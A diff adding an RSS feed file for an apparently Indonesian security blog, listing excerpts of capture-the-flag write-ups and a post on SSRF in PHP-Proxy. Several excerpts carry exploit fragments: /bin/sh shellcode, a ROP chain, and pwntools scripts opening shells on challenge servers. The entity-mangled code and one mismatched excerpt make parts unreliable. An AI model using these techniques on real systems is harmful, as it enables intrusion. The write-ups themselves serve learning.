@@ -1,0 +1,389 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts on /home/rhama/</title>
+    <link>rhamaa.github.io/post/</link>
+    <description>Recent content in Posts on /home/rhama/</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 10 May 2020 18:02:01 +0700</lastBuildDate>
+    
+	<atom:link href="rhamaa.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Exploiting Broken Crypto to SSRF On PHP-Proxy</title>
+      <link>rhamaa.github.io/post/exploiting-broken-crypto-to-ssrf-phpproxy/</link>
+      <pubDate>Sun, 10 May 2020 18:02:01 +0700</pubDate>
+      
+      <guid>rhamaa.github.io/post/exploiting-broken-crypto-to-ssrf-phpproxy/</guid>
+      <description>PHP-Proxy sebenarnya adalah project yang sudah tidak dikembangkan lagi, tapi disini saya melihat masih ada banyak orang yang menggunakan PHP-Proxy sebagai Web Proxy.
+PHP-Proxy Overview Url yang disubmit di form, akan di-encrypt dan dilakukan redirect ke /?q=&amp;lt;ENCRYPTED_URL&amp;gt;. add_http adalah fungsi yang akan menambahkan http:// apabila $url tidak diawali dengan https:// atau http://
+Apabila yang disubmit adalah file:///etc/passwd, oleh fungsi add_http akan me-return http://file:///etc/passwd sehingga kita tidak bisa exploit dengan cara men-submit URL lewat form.</description>
+    </item>
+    
+    <item>
+      <title>Cyber Jawara 2018 Web Exploitation</title>
+      <link>rhamaa.github.io/post/cyber-jawara-2018-web-exploitation/</link>
+      <pubDate>Sat, 11 Apr 2020 18:52:19 +0700</pubDate>
+      
+      <guid>rhamaa.github.io/post/cyber-jawara-2018-web-exploitation/</guid>
+      <description>Cyber Jawara 2018 Web Exploitation</description>
+    </item>
+    
+    <item>
+      <title>Basic Reverse Engineering Linux Binaries</title>
+      <link>rhamaa.github.io/post/2016-12-24-basic-reverse-engineering-linux-binaries/</link>
+      <pubDate>Sat, 24 Dec 2016 01:06:00 +0700</pubDate>
+      
+      <guid>rhamaa.github.io/post/2016-12-24-basic-reverse-engineering-linux-binaries/</guid>
+      <description>Assalamualaikum. Saya akan sedikit membahas basic dalam melakukan reverse engineering elf binnary, reverse engineering sendiri sangat penting apalagi dalam challenge CTF yang biasa nya mempunyai poin yang besar.
+The Code root@kali:~# cat rev.c #include int main(){	int a,b,c,d; a = 306; b = 737; c = 100 * a + b; printf(&amp;#34;Enter your passcode : &amp;#34;); scanf(&amp;#34;%d&amp;#34;, &amp;amp;d); if(d == c){ puts(&amp;#34;Correct&amp;#34;); else{ puts(&amp;#34;Incorrect&amp;#34;);	return 0; ``` Proof Of Concept ==================================== ``` c %} root@kali:~# gcc rev.</description>
+    </item>
+    
+    <item>
+      <title>Bugs Bunny 2k17 CTF - Pwn150</title>
+      <link>rhamaa.github.io/post/2017-07-22-bugs-bunny2k17-pwn150/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-07-22-bugs-bunny2k17-pwn150/</guid>
+      <description>Diberikan file ELF binary bernama pwn150 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.
+➜ file pwn150 pwn150: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=dc1ada44067255e5211fafc5133679404b54f110, not stripped Elf binary tersebut diproteksi NX (No-eXecute)
+gdb-peda$ checksec CANARY : disabled FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial Karena NX enabled, saya berasumsi untuk mengeksploitnya menggunakan teknik Return-to-libc.</description>
+    </item>
+    
+    <item>
+      <title>Bugs Bunny 2k17 CTF - Pwn50</title>
+      <link>rhamaa.github.io/post/2017-06-22-bugs-bunny2k17-pwn50/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-06-22-bugs-bunny2k17-pwn50/</guid>
+      <description>Diberikan file ELF binary bernama pwn50 64-Bit yang harus dibuatkan exploit nya agar bisa mendapatkan flag.
+➜ file pwn50 pwn50: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9100876ac8da789151a1afcbc3e43ddaca1305c1, not stripped Binary ini hanya meminta user input tanpa mengirim kembali outputnya
+➜ ./pwn50 saya ganteng Dengan menggunakan nm terlihat bahwa binary tersebut menggunakan fungsi gets() yang tidak membatasi user input sehingga dapat menyebabkan Buffer Overflow.</description>
+    </item>
+    
+    <item>
+      <title>Bugs Bunny 2k17 CTF - Rev75</title>
+      <link>rhamaa.github.io/post/2017-06-22-bugs-bunny2k17-rev75/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-06-22-bugs-bunny2k17-rev75/</guid>
+      <description>Deskripsi Soal i ran the binary but no password match but believe this is another simple reverse engineering challenge . Diberikan file elf binary static bernama rev75 64 bit yang harus direversing agar bisa mendapatkan flag.
+➜ rev75 file rev75 rev75: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=1bd9592380c83821bf975f46076118ecfd1964df, not stripped Binary tersebut membutuhkan password sebagai argumentnya
+➜ rev75 ./rev75 usage: ./rev75 password ➜ rev75 .</description>
+    </item>
+    
+    <item>
+      <title>Compfest 9 - {Preliminary} Write Up</title>
+      <link>rhamaa.github.io/post/2017-06-25-compfest9-writeup-quals/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-06-25-compfest9-writeup-quals/</guid>
+      <description>Posting tentang programming C pertama, dimana saya akan membahas mengenai File Input/Output di C dengan menggunakan berbagai macam fungsi yang berhubungan dengan File I/O di C yang sudah tersedia di pustaka &amp;ldquo;stdio.h&amp;rdquo;.
+Tipe Files Terdapat dua tipe files yang harus diketahui, yaitu Text File dan Binary File.
+ Text File - Adalah text file biasa yang berformat .txt dan dapat dibaca (readable) oleh manusia. Binary File - Adalah data nya disimpan dalam bentuk biner (0 dan 1) dan tidak dapat dibaca (not readable) oleh manusia.</description>
+    </item>
+    
+    <item>
+      <title>CSAW CTF 2017 Prelims - Write Up</title>
+      <link>rhamaa.github.io/post/2017-11-20-csawctf-2017-quals/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-20-csawctf-2017-quals/</guid>
+      <description>#r = process(&amp;quot;./true&amp;rdquo;)r =remote(&amp;quot;pwn.chal.csaw.io&amp;quot;, 8464)r.recvuntil(&amp;quot;Location:&amp;quot;)shellcode =&amp;quot;\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05&amp;quot;payload =&amp;quot;\x90&amp;quot;*(40-len(shellcode)) payload =shellcode +payload
+addr =int(r.recv(14),16)addr =p64(addr)payload_to_send =payload+addr
+log.info(&amp;quot;Payload Length %d&amp;quot;%(len(payload_to_send)))r.sendlineafter(&amp;quot;Command:&amp;quot;,payload_to_send)r.interactive()I wrote a little proxy program inNodeJS formy poems folder.
+Everyone wants to read flag.txt but I like it too much to share.
+http://web.chal.csaw.io:7311/?path=orange.txt</description>
+    </item>
+    
+    <item>
+      <title>CSAW CTF 2017 Prelims Write Up</title>
+      <link>rhamaa.github.io/post/2017-11-14-csawctf-2017-quals/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-14-csawctf-2017-quals/</guid>
+      <description>Didapatkan Locationmerupakan alamat stack dimana inputan penggunana akan disimpan dan dibutuhkan 40 bytes untuk meng overwriteregister RIP.
+Berikut exploit code yang digunakan
+Exploit code dijalankan.
+Flag : flag{1nput_c00rd1nat3s_Strap_y0urse1v3s_1n_b0ys}Stage 1 : meminta input nomor kartu kredit {Visa|Discover|American Express|MasterCard}
+Stage 2 : meminta input nomor kartu kredit dengan 4 digit prefix
+Stage 3 : meminta input nomor kartu kredit dengan 1 digit suffix
+Stage 4 : meminta input nomor kartu kredit dengan 4 digit suffix</description>
+    </item>
+    
+    <item>
+      <title>Cyber Jawara 2017 - Write Up</title>
+      <link>rhamaa.github.io/post/2017-11-20-cyber-jawara-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-20-cyber-jawara-2017/</guid>
+      <description></description>
+    </item>
+    
+    <item>
+      <title>Cyber Jawara 2017 Final - echo (pwn 200)</title>
+      <link>rhamaa.github.io/post/2017-11-06-cyber-jawara-2017-final-pwn200/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-06-cyber-jawara-2017-final-pwn200/</guid>
+      <description>Diberikan sebuah file elf binary 64 bit dengan nama echo
+Dengan proteksi sebagai berikut
+Berikut adalah hasil decompile menggunakan IDA pro
+Dari hasil decompile IDA pro dipastikan binary tersebut vulnerable terhadap Buffer Overflow karena menggunakan fungsi &amp;ldquo;gets()&amp;rdquo; yang tidak memfilter panjang inputan.
+Dengan asumsi bahwa ASLR pada mesin dalam keadaan ON dan binary tersebut di proteksi dengan NX bit yang tidak memungkinkan untuk eksekusi shellcode, sehingga teknik yang digunakan adalah ROP ( Return Oriented Programming).</description>
+    </item>
+    
+    <item>
+      <title>Cyber Jawara 2017 Final - echo (pwn 200)</title>
+      <link>rhamaa.github.io/post/2017-11-20-cyber-jawara-2017-final-pwn200/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-20-cyber-jawara-2017-final-pwn200/</guid>
+      <description>fromstruct importpack
+# Padding goes herep =&#39;A&#39;*10008p +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb080) # @ .datap +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000479ce6) # pop rax ; pop rdx ; pop rbx ; retp +=&amp;rsquo;/bin//sh&#39;p +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x4141414141414141) # paddingp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x4141414141414141) # paddingp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x0000000000401817) # pop rsi ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb088) # @ .data + 8p +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x000000000042695f) # xor rax, rax ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004755c1) # mov qword ptr [rsi], rax ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000004005d5) # pop rdi ; retp +=pack(&amp;rsquo;&amp;lt;Q&#39;, 0x00000000006cb080) # @ .</description>
+    </item>
+    
+    <item>
+      <title>EasyCTF IV 2018 - Reversing</title>
+      <link>rhamaa.github.io/post/2018-02-25-easyivctf-2018/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2018-02-25-easyivctf-2018/</guid>
+      <description>Liar Diberikan sebuah file binary 64-bit not stripped
+Hasil decompile fungsi main()
+int __cdecl main(int argc, const char **argv, const char **envp) { int result; // eax@12  __int64 v4; // rdi@12  int n; // [sp+Ch] [bp-14h]@1  int i; // [sp+10h] [bp-10h]@1  int m; // [sp+14h] [bp-Ch]@1  __int64 v8; // [sp+18h] [bp-8h]@1  v8 = *MK_FP(__FS__, 40LL); __isoc99_scanf(&amp;amp;unk_A64, &amp;amp;n, envp); f[30] = 160LL; f[10] = 47LL; f[13] = 4LL; f[25] = 205LL; f[5] = 87LL; f[24] = 247LL; f[6] = 76LL; f[31] = 176LL; f[7] = 74LL; f[34] = 154LL; f[21] = 231LL; f[32] = 135LL; f[8] = 75LL; f[1] = 102LL; f[9] = 75LL; f[28] = 232LL; f[29] = 148LL; f[3] = 108LL; f[11] = 33LL; f[4] = 127LL; f[14] = 21LL; f[18] = 89LL; f[16] = 3LL; f[26] = 215LL; f[20] = 211LL; f[15] = 8LL; f[17] = 25LL; f[27] = 217LL; f[0] = 101LL; f[33] = 143LL; f[22] = 245LL; f[19] = 241LL; f[12] = 56LL; f[36] = 129LL; f[23] = 206LL; f[2] = 125LL; f[35] = 202LL; m = n ^ 0x58EB29; for ( i = 0; i &amp;lt;= 36; ++i ) g[i] = m * i ^ (unsigned __int64)f[i]; g[i] = 0; if ( g[0] == 101 &amp;amp;&amp;amp; g[1] == 97 &amp;amp;&amp;amp; g[2] == 115 &amp;amp;&amp;amp; g[3] == 121 &amp;amp;&amp;amp; g[4] == 99 &amp;amp;&amp;amp; g[5] == 116 &amp;amp;&amp;amp; g[6] == 102 ) printf(&amp;#34;the flag is %s\n&amp;#34;, g); result = 0; v4 = *MK_FP(__FS__, 40LL) ^ v8; return result; } Dimana pada potongan code berikut</description>
+    </item>
+    
+    <item>
+      <title>Format String Attack</title>
+      <link>rhamaa.github.io/post/2018-05-30-format-string-attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2018-05-30-format-string-attack/</guid>
+      <description>Format String Attack Format String Attack adalah vulnerability yang memanfaatkan format specifiers yang dimana dapat dimanfaatkan untuk melakukan read/write pada memory. Fungsi printf family seperti (printf, fprintf, dprintf, sprintf, snprintf, vprintf, vfprintf, vdprintf, vsprintf, vsnprintf) tergolong kedalam fungsi yang vulnerable Format String Attack.
+Format String Attack terjadi karena inputan user langsung di render oleh fungsi yang menggunakan prinsip Format Specifier (seperti printf family) sehingga nilai-nilai yang berada pada memory dapat diread/write.</description>
+    </item>
+    
+    <item>
+      <title>hxp CTF 2017 - cloud18 (web 150)</title>
+      <link>rhamaa.github.io/post/2017-11-20-hxpctf-2017-web150/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-20-hxpctf-2017-web150/</guid>
+      <description>Diberikan sebuah website beserta source code nya. Tampilan awal web tersebut hanya terdapat form login dan register. fungsi web tersebut adalah online editor, fungsi editor sendiri akan muncul setelah user login. Berikut daftar file source code yang diberikan
+Snippet editor.phpif (preg_match(&amp;#34;/exec|system|passthru|`|proc_open|popen/&amp;#34;, strtolower($_POST[&amp;#34;method&amp;#34;].$_POST[&amp;#34;text&amp;#34;])) != 0) { exit(&amp;#34;Do you really think you could pass something to the command line? Functions like this are often disabled! Maybe have a look at the source?&amp;#34;); } .</description>
+    </item>
+    
+    <item>
+      <title>hxp CTF 2017 - cloud18 (web 150)</title>
+      <link>rhamaa.github.io/post/2017-11-27-hxpctf-2017-cloud18/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-27-hxpctf-2017-cloud18/</guid>
+      <description>65e868ae9518a3fd226e71d4041be9d4cd8350d7552b46832f3e7f0b5d6e03af.tar.xzConnection:</description>
+    </item>
+    
+    <item>
+      <title>Juniors CTF 2017 - Write up</title>
+      <link>rhamaa.github.io/post/2017-12-3-juniorsctf-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-12-3-juniorsctf-2017/</guid>
+      <description>Website PR me, please Diberikan sebuah web 10.0.181.112:15110, untuk mendapatkan flag cukup gunakan salah satu situs dibawah ini sebagai Referer ke situs challenge.
+https://www.yandex.ru/ https://www.facebook.com/ https://www.wikipedia.org/ https://telegram.org/ https://www.whatsapp.com/ $ curl -e &amp;#39;www.yandex.ru&amp;#39; &amp;#39;http://10.0.181.112:15110/&amp;#39; Flag : yoUUGOOODhacker46466464 Stegano Sweet dreams Diberikan sebuah file doc bernama _.doc. Untuk mendapatkan Flag, cukup dengan melakukan unzip
+$ strings _.doc | grep flag word/media/flag.png word/media/flag.png $ unzip _.doc Setelah itu Flag berada di word/media/flag.png
+Flag : DIFFERENT AGE SANDWICH?</description>
+    </item>
+    
+    <item>
+      <title>pwnable.kr - random</title>
+      <link>rhamaa.github.io/post/2016-12-21-pwnable.kr-random/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2016-12-21-pwnable.kr-random/</guid>
+      <description>Pada situs pwnable.kr, diberikan challenge berupa random number generate dengan source code
+#include &amp;lt;stdio.h&amp;gt; int main(){ unsigned int random; random = rand();	// random value!  unsigned int key=0; scanf(&amp;#34;%d&amp;#34;, &amp;amp;key); if( (key ^ random) == 0xdeadbeef ){ printf(&amp;#34;Good!\n&amp;#34;); system(&amp;#34;/bin/cat flag&amp;#34;); return 0; } printf(&amp;#34;Wrong, maybe you should try 2^32 cases.\n&amp;#34;); return 0; } Fungsi rand() akan mengembalikan nilai pseudo-random antara 0 dan RAND_MAX. Value dari fungsi rand() akan disimpan pada variable random, dan terdapat variable key yang menampung user input sehingga pada kondisi if dilakukan XOR antara key ^ random jika hasil nya 0xdeadbeef akan mendapatkan flag.</description>
+    </item>
+    
+    <item>
+      <title>Pwnable.tw - Start (100)</title>
+      <link>rhamaa.github.io/post/2017-11-06-pwnabletw-start/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-06-pwnabletw-start/</guid>
+      <description>Diberikan sebuah binary bernama start, yang vulnerable buffer overflow, karena buffer inputan lebih besar dari buffer variable penampung.
+Berikut informasi binary start.
+Hasil disassembly menggunaan Binary Ninja pada fungsi _start Diketahui bahwa binary start ditulis menggunakan asm x86 dan menggunakan 3 syscall yaitu write, read dan exit. Referensi tentang syscall dapat dilihat disiniPada bagian warna biru adalah proses pemanggilan syscall write dan bagian warna merah adalah pemanggilan syscall read . Lalu bagian kuning paling bawah adalah prospes stack akan di naikan sebanyak 20 bytes, sehingga Top Of Stack nya adalah alamat dari fungsi _exit dan program akan loncat ke fungsi _exit untuk mengakhiri eksekusi.</description>
+    </item>
+    
+    <item>
+      <title>Pwnable.tw - Start (100)</title>
+      <link>rhamaa.github.io/post/2017-11-20-pwnabletw-start/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-20-pwnabletw-start/</guid>
+      <description>context(arch=&amp;quot;i386&amp;quot;,os=&amp;quot;linux&amp;quot;)
+# http://shell-storm.org/shellcode/files/shellcode-811.phpshellcode =&amp;quot;&amp;ldquo;shellcode +=&amp;quot;\x31\xc0\x50\x68\x2f\x2f\x73&amp;quot;shellcode +=&amp;quot;\x68\x68\x2f\x62\x69\x6e\x89&amp;quot;shellcode +=&amp;rdquo;\xe3\x89\xc1\x89\xc2\xb0\x0b&amp;quot;shellcode +=&amp;rdquo;\xcd\x80\x31\xc0\x40\xcd\x80&amp;quot;mov_ecx_esp =p32(0x08048087)
+start =remote(&amp;quot;chall.pwnable.tw&amp;quot;,10000) start.recvuntil(&amp;quot;CTF:&amp;ldquo;) payload =&amp;quot;A&amp;quot;20+mov_ecx_esp start.send(payload) stack=start.recv(4) stack_addr =u32(stack) printhex(stack_addr) payload_next=&amp;quot;A&amp;quot;20+p32(stack_addr+20)+&amp;quot;\x90&amp;quot;*4+shellcode start.sendline(payload_next) start.interactive() </description>
+    </item>
+    
+    <item>
+      <title>RC3 CTF 2017 - Write Up</title>
+      <link>rhamaa.github.io/post/2017-12-1-rc3ctf-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-12-1-rc3ctf-2017/</guid>
+      <description>v2 = 0; v1 = 0; printf(&amp;ldquo;Enter Key: &amp;ldquo;); gets((char *)&amp;amp;v0); if ( v2 == 0xCAFEF00D &amp;amp;&amp;amp; v1 == 0xC0FFEE ) sub_80484EF(); puts(&amp;ldquo;Error: Invalid key!&amp;quot;); srand(1u); init(); } baby=remote(&amp;quot;18.216.183.46&amp;quot;,4200)p=&amp;quot;&amp;ldquo;p+=&amp;quot;A&amp;quot;*16p+=p32(0xC0FFEE)# v1p+=p32(0xCAFEF00D)# v2baby.sendlineafter(&amp;rdquo;: &amp;ldquo;,p)printbaby.</description>
+    </item>
+    
+    <item>
+      <title>RC3 CTF 2017 Write Up</title>
+      <link>rhamaa.github.io/post/2017-11-20-rc3-ctf-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-20-rc3-ctf-2017/</guid>
+      <description>Reversing (100) Diberikan file elf 64bit not stripped.
+$ file hello hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped Hanya dengan menggunakan strings didapatkan Flag yang benar.
+$ strings hello | grep RC RC3-2017{little_ball_of_fur} Cukup mudah untuk challenge dengan points 100 :)
+Flag : RC3-2017{little_ball_of_fur}
+Web (100) Diberikan sebuah website http://13.59.6.98
+$ curl http://13.59.6.98 &amp;lt;meta http-equiv=&amp;#34;refresh&amp;#34; content=&amp;#34;0; url=C.html&amp;#34; /&amp;gt; &amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt; Website tersebut akan otomatis direfresh apabila dikunjungi via Browser.</description>
+    </item>
+    
+    <item>
+      <title>RC3 CTF 2017 Write Up</title>
+      <link>rhamaa.github.io/post/2017-11-21-rc3-ctf-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-21-rc3-ctf-2017/</guid>
+      <description>Reversing (100) Diberikan file elf 64bit not stripped.
+$ file hello hello: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e85915bc2c95f7eac6c02254b065d9161e5efca2, not stripped Hanya dengan menggunakan strings didapatkan Flag yang benar.
+$ strings hello | grep RC RC3-2017{little_ball_of_fur} Cukup mudah untuk challenge dengan points 100 :) Flag : RC3-2017{little_ball_of_fur}
+Web (100) Diberikan sebuah website ()[http://13.59.6.98]
+$ curl http://13.59.6.98 &amp;lt;meta http-equiv=&amp;#34;refresh&amp;#34; content=&amp;#34;0; url=C.html&amp;#34; /&amp;gt; &amp;lt;p hidden&amp;gt;R&amp;lt;/p&amp;gt; Website tersebut akan otomatis direfresh apabila dikunjungi via Browser.</description>
+    </item>
+    
+    <item>
+      <title>School CTF 2017 - Write Up</title>
+      <link>rhamaa.github.io/post/2017-11-27-school-ctf-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-27-school-ctf-2017/</guid>
+      <description>Task URLCan you find it?
+Task URLdefip2long(ip): aton =inet_aton(ip) returnunpack(&amp;rdquo;!L&amp;quot;,aton)[0]
+defmain(): URL =&amp;quot;http://portscan.task.school-CTF.org/port&amp;quot;IP =&amp;quot;127.0.0.1&amp;quot;HOST =ip2long(IP) PORT =&amp;quot;31337&amp;quot;print&amp;quot;Host : {}&amp;ldquo;.format(HOST) r =requests.post(URL,data={&amp;quot;host&amp;quot;: HOST,&amp;quot;port&amp;quot;: PORT}) raw_content =r.content flag =re.findall(&amp;quot;SchoolCTF{.*?}&amp;ldquo;,raw_content) print&amp;quot;Flag : {}&amp;ldquo;.format(flag[0]) if__name__==&amp;rsquo;main&amp;lsquo;: main() p.s. It seems that one of them said that they haven&amp;rsquo;t yet fully configured the security system and the password can be cracked. Safe URLdefa(pin): if(int(pin[0]) +int(pin[1]) +int(pin[2])) %10==int(pin[3]): returnpin else: returnNonepin_list =[] prod_pin =product(&amp;quot;123456789&amp;quot;,repeat=4) prod_pin =[&amp;quot;&amp;ldquo;.join(x) forx inlist(prod_pin)] prod_pin =map(a,prod_pin) prod_pin =filter(None,prod_pin) prod_pin =list(set(prod_pin)) pin_list+=prod_pin</description>
+    </item>
+    
+    <item>
+      <title>School CTF 2017 Write Up</title>
+      <link>rhamaa.github.io/post/2017-11-15-school-ctf-2017/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2017-11-15-school-ctf-2017/</guid>
+      <description>Task URLSitus tersebut menggunakan self signed ssl, dan Flag nya terdapat pada bagian Organizational unit (OU).
+Flag : SchoolCTF{n0t_so+$eCur3}Can you find it?
+Task URLWeb tersebut menyediakan fasilitas scan port. dimana terdapat 2 fitur,
+yang pertama &amp;lsquo;Scan the host to get the list of open ports&amp;rsquo;
+terlihat port 31337 dengan service SchoolCTF Flag Serverdalam keadaan Open.
+Yang kedua &amp;ldquo;Identify the single port on the host&amp;rdquo;
+Tetapi apabila me scan &amp;ldquo;localhost&amp;rdquo; atau &amp;ldquo;127.</description>
+    </item>
+    
+    <item>
+      <title>SharifCTF 2016 - Camera Model</title>
+      <link>rhamaa.github.io/post/2016-12-23-suctf2016-camera-model/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2016-12-23-suctf2016-camera-model/</guid>
+      <description>Challenge Misc SharifCTF 2016 diberikan file bernama Image_Viewer yang akan menampilkan sebuah foto dan model kamera yang digunakan untuk mengambil foto tersebut merupakan flag.
+root@kali:~/Desktop/SU CTF# file Image_Viewer Image_Viewer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c3aaafe49fbcc6a7a2adbcdf4f3c2dd125a3dd32, not stripped Proof Of Concept Saya menggunakan binwalk untuk melakukan signature scan
+root@kali:~/Desktop/SU CTF# binwalk Image_Viewer DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 ELF, 64-bit LSB executable, AMD x86-64, version 1 (SYSV) 5432 0x1538 Zlib compressed data, best compression Tidak terdapat signature file gambar, tapi saya mencoba mengekstrack gambar tersebut dengan option -e pada binwalk</description>
+    </item>
+    
+    <item>
+      <title>SharifCTF 2016 - Getit</title>
+      <link>rhamaa.github.io/post/2016-12-22-suctf2016-getit/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2016-12-22-suctf2016-getit/</guid>
+      <description>Pada challenge RE ShariftCTF 2016 diberikan file elf binnary bernama getit, yang informasi nya seperti dibawah ini
+root@kali:~/Desktop/SU CTF/RE# file getit getit: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=e389cd7a4b9272ba80f85d7eb604176f6106c61e, not stripped Proof Of Concept Saya menggunakan gdb untuk melakukan debugging
+root@kali:~/Desktop/SU CTF/RE# gdb -q getit Reading symbols from getit...(no debugging symbols found)...done. (gdb) set disassembly-flavor intel (gdb) disass main Dump of assembler code for function main: --- snip --- 0x000000000040080d &amp;lt;+183&amp;gt;:	call 0x400620 &amp;lt;fprintf@plt&amp;gt; 0x0000000000400812 &amp;lt;+188&amp;gt;:	mov DWORD PTR [rbp-0x3c],0x0 0x0000000000400819 &amp;lt;+195&amp;gt;:	mov eax,DWORD PTR [rbp-0x3c] 0x000000000040081c &amp;lt;+198&amp;gt;:	movsxd rbx,eax 0x000000000040081f &amp;lt;+201&amp;gt;:	mov edi,0x6010e0 0x0000000000400824 &amp;lt;+206&amp;gt;:	call 0x4005e0 &amp;lt;strlen@plt&amp;gt; 0x0000000000400829 &amp;lt;+211&amp;gt;:	cmp rbx,rax 0x000000000040082c &amp;lt;+214&amp;gt;:	jae 0x4008b5 &amp;lt;main+351&amp;gt; --- snip --- Ditemukan bagian menarik pada offset 0x000000000040081f at +201, dimana terdapat &amp;ldquo;sesuatu&amp;rdquo; yang disalin ke register edi.</description>
+    </item>
+    
+    <item>
+      <title>SharifCTF 2016 - SCrack</title>
+      <link>rhamaa.github.io/post/2016-12-22-suctf2016-scrack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>rhamaa.github.io/post/2016-12-22-suctf2016-scrack/</guid>
+      <description>Challenge RE SharifCTF 2016 SCrack berupa file elf binnary 64bit yang akan melakukan validasi key
+root@kali:~/Desktop/SU CTF/RE# file SCrack SCrack: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d011afc29443bbb3ea2c72ef5ac15f8dc278397a, not stripped root@kali:~/Desktop/SU CTF/RE# ./SCrack Enter the valid key! asasasasasas Invalid Key! :( Saat mencoba menggunakan ltrace terdapat output Dont trace me! dan percobaan disassembly menggunakan gdb ditemukan ptrace yang digunakan sebagai anti-debugging technique</description>
+    </item>
